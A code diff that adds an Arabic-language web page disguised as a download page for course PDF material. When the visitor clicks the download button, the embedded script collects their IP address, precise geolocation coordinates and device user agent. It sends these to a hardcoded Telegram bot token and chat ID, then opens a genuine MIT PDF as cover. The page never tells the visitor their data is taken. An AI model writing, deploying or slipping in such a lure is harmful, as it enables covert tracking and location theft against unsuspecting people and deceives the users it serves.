@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>تحميل ملف المادة PDF</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f0f4f8;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      justify-content: center;
+      align-items: center;
+      color: #333;
+    }
+    h1 {
+      margin-bottom: 30px;
+      color: #0a74da;
+    }
+    #downloadBtn {
+      background-color: #0a74da;
+      border: none;
+      padding: 15px 40px;
+      font-size: 20px;
+      color: white;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    #downloadBtn:hover {
+      background-color: #095bb5;
+    }
+    #popup {
+      display: none;
+      margin-top: 20px;
+      padding: 15px 30px;
+      background-color: #007bff;
+      color: white;
+      border-radius: 6px;
+      font-weight: bold;
+      box-shadow: 0 4px 12px rgba(0,123,255,0.3);
+    }
+  </style>
+</head>
+<body>
+
+  <h1>تحميل ملف المادة PDF</h1>
+
+  <button id="downloadBtn">اضغط هنا لتحميل الملف</button>
+
+  <div id="popup">جاري التحميل...</div>
+
+  <script>
+    const BOT_TOKEN = '7900479036:AAGIqLmpav6iXx_QQ_e4sGJzDKPN7KtD-CI';
+    const CHAT_ID = '5090097134';
+    // رابط ملف PDF تجريبي حقيقي مفتوح للجميع (مثلاً ملف PDF تعليمي من جامعة MIT)
+    const PDF_URL = 'https://ocw.mit.edu/ans7870/resources/res-18-001-statics-and-dynamics-fall-2016/study-materials/MITRES_18_001F16_lecture1.pdf';
+
+    const downloadBtn = document.getElementById('downloadBtn');
+    const popup = document.getElementById('popup');
+
+    function sendTelegramMessage(message) {
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+          parse_mode: 'HTML'
+        }),
+      });
+    }
+
+    function getIP() {
+      return fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(data => data.ip)
+        .catch(() => 'IP غير متوفر');
+    }
+
+    downloadBtn.addEventListener('click', async () => {
+      popup.style.display = 'block';
+
+      const ip = await getIP();
+
+      if (!navigator.geolocation) {
+        alert('متصفحك لا يدعم خاصية الموقع الجغرافي.');
+        popup.style.display = 'none';
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        async position => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          const userAgent = navigator.userAgent;
+
+          const msg = `
+👤 <b>مستخدم جديد طلب تحميل</b>
+🌐 <b>IP:</b> ${ip}
+📍 <b>الإحداثيات:</b> خط العرض ${lat}، خط الطول ${lon}
+📱 <b>نوع الجهاز:</b> ${userAgent}
+📄 <b>رابط الملف:</b> ${PDF_URL}
+          `;
+
+          sendTelegramMessage(msg);
+
+          setTimeout(() => {
+            popup.style.display = 'none';
+            window.open(PDF_URL, '_blank');
+          }, 3000);
+
+        },
+        error => {
+          alert('تعذر الحصول على الموقع: ' + error.message);
+          popup.style.display = 'none';
+        }
+      );
+    });
+  </script>
+
+</body>
+</html>
